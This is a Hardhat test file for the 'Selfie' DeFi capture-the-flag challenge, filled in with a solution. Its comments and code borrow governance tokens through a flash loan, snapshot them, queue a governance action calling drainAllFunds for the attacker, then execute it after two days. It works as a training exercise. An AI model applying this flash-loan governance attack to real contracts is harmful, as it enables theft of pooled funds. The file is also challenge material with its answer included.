const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        //We have to construct an attacker contract in order to steal all funds from the pool. 
        //Firstly, because it is needed to get the flash loan from it. From there, we will interact with governance contract as well.
        //We can register an action in governance contract when we get the tokens with the flahs loan. 
        //For that, we must pass through the requirements. As governance token is ERC20Snapshot and it is using that functionality to check balances, etc,
        //we must make a snapshot in our governance token previously and enqueue the action afterwards, to trick the logic. 
        //The action enqueued is an encoded call to pool contract drainAllFunds function with the attacker address as its receiver.
        //Then, the flash loan is sent back to the pool. 
        //After 2 days, we can execute the recorded governance action externally or even from the attacker contract if its built for that purpouse.  
        
        const attackerContractFactory = await ethers.getContractFactory('SelfieAttacker', deployer);
        const attackerContract = await attackerContractFactory.deploy(this.pool.address, this.token.address, this.governance.address ,attacker.address); 

        console.log("Pool token balance:", (await this.token.balanceOf(this.pool.address)).toString())
        console.log("Attacker address token balance:", (await this.token.balanceOf(attacker.address)).toString())
        console.log("Id value before enqueuing action with flashloan", (await attackerContract.idAction()).toString())
        await attackerContract.connect(attacker).attack(TOKENS_IN_POOL);
        console.log("Id value after enqueuing action with flashloan", (await attackerContract.idAction()).toString())
        const actionId = await attackerContract.idAction();
        
        // Advance time 2 days so that executeAction can be called in governance contract
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await this.governance.executeAction(actionId);
        console.log("Pool token balance:", (await this.token.balanceOf(this.pool.address)).toString())
        console.log("Attacker address token balance:", (await this.token.balanceOf(attacker.address)).toString())
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
